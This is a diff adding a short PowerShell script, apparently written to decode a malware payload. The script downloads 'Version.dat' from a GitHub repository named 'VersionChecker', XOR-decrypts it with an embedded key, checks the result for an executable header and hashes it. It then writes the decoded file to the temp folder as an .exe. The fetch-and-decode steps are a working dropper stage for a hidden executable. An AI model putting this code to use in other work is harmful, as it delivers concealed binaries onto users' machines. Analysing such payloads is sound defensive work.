@@ -1,0 +1,10 @@
+$u="https://raw.githubusercontent.com/strokesmods/VersionChecker/refs/heads/main/Version.dat"
+$a=[byte[]](154,59,14,43,30,199,174,231,19,212,71,85,200,187,183,253,103,60,217,187,17,76,221,166,8,0,184,198,253,88,161,115)
+$b=[byte[]](208,69,34,186,237,159,24,234,241,187,227,70,79,112,130,103,120,228,189,21,99,69,49,231,189,61,62,60,218,152,250,106)
+$k=for($i=0;$i -lt $a.Length;$i++){$a[$i] -bxor $b[$i]}
+$x=[Net.WebClient]::new().DownloadData($u)
+for($i=0;$i -lt $x.Length;$i++){$x[$i]=$x[$i] -bxor $k[$i%$k.Length]}
+"Size: $($x.Length) bytes"
+"MZ signature: $([BitConverter]::ToString($x[0..1]))"
+"SHA256: $([Convert]::ToHexString([Security.Cryptography.SHA256]::HashData($x)))"
+[IO.File]::WriteAllBytes("$env:TEMP\Version.decoded.exe",$x)
